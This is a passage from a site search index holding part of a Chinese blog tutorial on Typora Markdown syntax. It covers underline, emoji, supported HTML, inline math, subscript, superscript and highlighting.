class="headerlink" title="下划线"></a>下划线</h3><p>跟HTML语法一样。</p><p><code>&lt;u&gt;Underline&lt;/u&gt;</code> becomes <u>Underline</u>.</p><h3 id="表情-happy"><a href="#表情-happy" class="headerlink" title="表情:happy:"></a>表情:happy:</h3><p>插入笑脸用<code>:smile</code>，得到:smile:</p><p>还有其他一些标签，键入<code>:</code>会根据后面的英文字符查找相关表情。</p><p>比如<code>:cry:</code>，:cry:</p><p>遵循这样的规则使用即可。</p><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><p>Typora只支持有限的HTML语法，如下，我就不翻译了。</p><p>Typora cannot render html fragments. But typora can parse and render very limited HTML fragments, as an extension of Markdown, including:</p><ul><li>Underline: <code>&lt;u&gt;underline&lt;/u&gt;</code></li><li>Image: <code>&lt;img src=&quot;http://www.w3.org/html/logo/img/mark-word-icon.png&quot; width=&quot;200px&quot; /&gt;</code> (And <code>width</code>, <code>height</code> attribute in HTML tag, and <code>width</code>, <code>height</code>, <code>zoom</code> style in <code>style</code> attribute will be applied.)</li><li>Comments: <code>&lt;!-- This is some comments --&gt;</code></li><li>Hyperlink: <code>&lt;a href=&quot;http://typora.io&quot; target=&quot;_blank&quot;&gt;link&lt;/a&gt;</code>.</li></ul><p>Most of their attributes, styles, or classes will be ignored. For other tags, typora will render them as raw HTML snippets. </p><p>But those HTML will be exported on print or export.</p><h3 id="行内数学公式"><a href="#行内数学公式" class="headerlink" title="行内数学公式"></a>行内数学公式</h3><p>前面提到了，这里举个例子。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$\lim<span class="emphasis">_&#123;x\to\infty&#125;\exp(-x)=0$</span></span><br></pre></td></tr></table></figure><p>$\lim_{x\to\infty}\exp(-x)=0$</p><p>同样的公式，我用<code>$$</code>分隔就会变成：</p><p>$$<br>\lim_{x\to\infty}\exp(-x)=0<br>$$</p><p>可以看到显示效果的不同哈。</p><h3 id="下标"><a href="#下标" class="headerlink" title="下标"></a>下标</h3><p>用一个<code>~</code>，如果要写水分子，我们可以使用<code>H~2~O</code>，它就会变成H<del>2</del>O.</p><p>这个功能默认没打开，To use this feature, first, please enable it in <code>Preference</code> Panel -&gt; <code>Markdown</code> Tab. </p><p>现在看看H<del>2</del>O。</p><h3 id="上标"><a href="#上标" class="headerlink" title="上标"></a>上标</h3><p>用一个<code>^</code>前后分隔。</p><p>X的平方可以表示为<code>X^2^</code>，即X^2^ 。</p><h3 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h3><p>用两个<code>==</code>在前后分隔对文本高亮。</p><p><code>==highlight==</code>会变成</p><p>==highlight==</p><h1 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h1><p>因为个人能力有限，翻译和讲解不可能尽善尽美，望谅解。</p><p>关于Typora的使用除了查看本文档外，还需要大家自己多摸索。用<code>Ctrl</code>加逗号键可以打开Typora的选项设定，有的功能没有激活，需要我们手动设定下，也可以看看有其他什么有趣有用的功能。欢迎留言评论。</p><p>最后说明，因为Markdown编辑器不同，简书或者博客上查阅可能有一些小问题。以Typora编辑器为准。为保证文章目录正常，去掉了一些实例显示。</p>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
            <tag> Markdown </tag>
            
            <tag> Typora </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
